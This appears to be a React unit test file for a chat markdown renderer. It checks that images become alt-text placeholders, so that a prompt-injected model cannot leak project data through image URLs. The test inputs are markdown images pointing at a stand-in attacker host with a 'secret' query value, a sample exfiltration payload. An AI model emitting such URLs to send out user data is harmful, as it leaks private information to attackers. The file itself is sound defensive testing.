import { describe, expect, it } from "vitest"
import { render, screen } from "@testing-library/react"
import { ChatMarkdown } from "./ChatMarkdown"

// A prompt-injected model could encode project data into an image URL, so chat
// markdown must never mount an <img>. The stand-in is catalog copy (AQU-1401).
describe("ChatMarkdown images", () => {
  it("shows a described image as its alt text and never puts the URL in the page", () => {
    const { container } = render(<ChatMarkdown content="![quarterly chart](https://attacker.example/x.png?d=secret)" />)
    expect(screen.getByText("[image: quarterly chart]")).toBeVisible()
    expect(container.querySelector("img")).toBeNull()
    expect(container.innerHTML).not.toContain("attacker.example")
  })

  it("shows an undescribed image as the bare placeholder, not a message key", () => {
    const { container } = render(<ChatMarkdown content="![](https://attacker.example/x.png)" />)
    expect(screen.getByText("[image]")).toBeVisible()
    expect(container.querySelector("img")).toBeNull()
    expect(container.textContent).not.toContain("workspace.chatMarkdown")
  })
})
